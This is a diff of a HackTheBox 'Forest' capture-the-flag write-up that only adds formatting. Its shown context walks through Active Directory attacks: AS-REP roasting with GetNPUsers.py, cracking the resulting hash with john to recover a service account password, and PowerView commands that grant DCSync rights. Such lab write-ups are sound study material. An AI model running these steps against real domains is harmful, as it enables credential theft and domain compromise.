@@ -11,6 +11,7 @@ excerpt: Forest is an easy machine from HackTheBox which involves a couple of AD
 ## Recon
 
 ### port scan
+
 ```js
 PORT      STATE SERVICE      REASON  VERSION
 53/tcp    open  domain       syn-ack Simple DNS Plus
@@ -72,6 +73,9 @@ Host script results:
 |_  System time: 2023-01-19T04:44:08-08:00
 |_clock-skew: mean: -2h43m11s, deviation: 4h37m08s, median: -5h23m12s
 ```
+<br>
+
+- It's an Active Directory machine, so first let's use enum4linux to get info about the users and groups
 
 ### enum4linux
 
@@ -188,13 +192,13 @@ group:[Service Accounts] rid:[0x47c]
 group:[Privileged IT Accounts] rid:[0x47d]
 group:[test] rid:[0x13ed]
 ```
+<br>
 
 - Domain name: `htb.local`
 - Forest name: `htb.local`
 - Computer name: `FOREST`
 - Create **users.txt** with the user names
 - Let's use `GetNPUsers.py` to see available kerberoastable users
-
 
 ## Initial Foothold
 
@@ -206,9 +210,11 @@ Name          MemberOf                                                PasswordLa
 ------------  ------------------------------------------------------  --------------------------  --------------------------  --------
 svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-01-19 18:31:16.073285  2019-09-23 16:39:47.931194  0x410200
 ```
+<br>
 
 - Looks like `svc-alfresco` is kerberoastable, let's request a ticket
 
+<br>
 
 ```js
 ➜  forest GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -request
@@ -222,8 +228,11 @@ svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-01-19
 
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:f66921928fc0adb11fd1f06ecb523668$be875c2c0fa9ad1b3376c582651c71c36c1b4e9a3cf944e454e5ce30e4ee4524edcae4bfe35ee99101030a477f1790b604d259137c878ffd30e52c33f1485b35080827d92872da82262295e243c9bff0684d8ea7b1a1eec1aa95eaf95d0d16e94970dc98c367ef0b7fcd65ff78e6c32ff7f6a821df67599409704f20bfc21a90e12115ee6412c42dbf0812fa4a1fdaec71c69dd6496c561915602a224ad7fc1c642fde63c179cae977754e3faad762408053146a15a9b05d3fab70f28989c1cd7de2bd812e917556dacd6e54dae58d1fa900486cab328e4f64ee344383237c77f5b6e4b4efd3
 ```
+<br>
 
 - Let's crack this hash
+
+<br>
 
 ```js
 ➜  forest john --wordlist=/opt/seclists/Passwords/Leaked-Databases/rockyou.txt svc_alfersco_hash
@@ -236,6 +245,7 @@ s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
+<br>
 
 - Creds `svc-alfresco:s3rvice`
 
@@ -279,6 +289,8 @@ With write access to the target object's DACL, you can grant yourself any privil
 - First let's give us `DCSync` privileges and exploit that
 - Here we need [powerview]( https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) script to execute these commands, so import that
 
+<br>
+
 ```js
 Import-Module .\PowerView.ps1
 Add-Type -AssemblyName System.Management.Automation
@@ -287,6 +299,7 @@ $Password = ConvertTo-SecureString "hacker@123" -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential($UserName, $Password)
 Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity hacker -TargetIdentity "DC=htb,DC=local" -Rights DCSync
 ```
+<br>
 
 - Note: You need to specify the user in `-PrincipalIdentiy`, bloodhound page doesn't have that extra argument, so don't forget to add this
 
